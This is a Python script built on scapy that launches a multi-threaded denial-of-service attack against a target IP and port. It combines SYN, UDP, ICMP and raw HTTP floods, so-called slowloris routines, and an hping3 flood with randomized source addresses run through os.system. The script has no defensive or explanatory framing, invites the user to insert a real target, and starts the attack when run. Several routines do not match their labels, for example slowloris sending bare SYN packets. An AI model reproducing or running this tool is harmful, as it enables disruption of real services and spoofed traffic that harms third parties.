import threading
from scapy.all import *
import os
import time

# Function to perform the DDoS attack based on attack type
def perform_ddos(target_ip, port, num_packets, interval, attack_type):
    try:
        if attack_type == "syn_flood":
            syn_flood(target_ip, port, num_packets, interval)
        elif attack_type == "udp_flood":
            udp_flood(target_ip, port, num_packets, interval)
        elif attack_type == "icmp_flood":
            icmp_flood(target_ip, port, num_packets, interval)
        elif attack_type == "http_flood":
            http_flood(target_ip, port, num_packets, interval)
        elif attack_type == "slowloris":
            slowloris(target_ip, port, num_packets, interval)
        elif attack_type == "http_slowloris":
            http_slowloris(target_ip, port, num_packets, interval)
        elif attack_type == "hping3":
            hping3_attack(target_ip, port, num_packets, interval)
    except Exception as e:
        print(f"Error during {attack_type}: {e}")

# SYN Flood
def syn_flood(target_ip, port, num_packets, interval):
    syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
    for _ in range(num_packets):
        send(syn_packet, verbose=False)
        time.sleep(interval)

# UDP Flood
def udp_flood(target_ip, port, num_packets, interval):
    udp_packet = IP(dst=target_ip) / UDP(dport=port) / Raw(b"X" * 1024)
    for _ in range(num_packets):
        send(udp_packet, verbose=False)
        time.sleep(interval)

# ICMP Flood
def icmp_flood(target_ip, port, num_packets, interval):
    icmp_packet = IP(dst=target_ip) / ICMP()
    for _ in range(num_packets):
        send(icmp_packet, verbose=False)
        time.sleep(interval)

# HTTP Flood
def http_flood(target_ip, port, num_packets, interval):
    http_packet = IP(dst=target_ip) / TCP(dport=port) / Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    for _ in range(num_packets):
        send(http_packet, verbose=False)
        time.sleep(interval)

# Slowloris
def slowloris(target_ip, port, num_packets, interval):
    slowloris_packet = IP(dst=target_ip) / TCP(dport=port, flags="S") / Raw(b"X" * 1024)
    for _ in range(num_packets):
        send(slowloris_packet, verbose=False)
        time.sleep(interval)

# HTTP Slowloris
def http_slowloris(target_ip, port, num_packets, interval):
    http_slowloris_packet = IP(dst=target_ip) / TCP(dport=port, flags="S") / Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    for _ in range(num_packets):
        send(http_slowloris_packet, verbose=False)
        time.sleep(interval)

# Hping3 attack (executes a shell command)
def hping3_attack(target_ip, port, num_packets, interval):
    command = f"hping3 -S --flood -p {port} --rand-source -d 1200 --data \"This is a payload\" {target_ip}"
    for _ in range(num_packets):
        os.system(command)
        time.sleep(interval)

# Starting the attack with multiple threads and attack types
def start_attack(target_ip, port, num_threads, num_packets, interval, attack_types):
    threads = []
    
    print(f"Starting DDoS attack on {target_ip} at port {port} with attack types: {', '.join(attack_types)}")
    
    for attack_type in attack_types:
        for _ in range(num_threads):
            t = threading.Thread(target=perform_ddos, args=(target_ip, port, num_packets, interval, attack_type))
            threads.append(t)
            t.start()

    # Joining all threads
    for t in threads:
        t.join()
    
    print("Attack completed successfully.")

# Usage example
target_ip = "192.168.0.107"  # Replace with the real target IP address
port = 80  # Replace with the target port
num_threads = 50  # Reduced number of threads for testing
num_packets = 1000  # Total number of packets to send per thread
interval = 0.001  # Interval between packets in seconds
attack_types = ["syn_flood", "udp_flood", "icmp_flood", "http_flood", "slowloris", "http_slowloris", "hping3"]  # List of attack types

start_attack(target_ip, port, num_threads, num_packets, interval, attack_types)
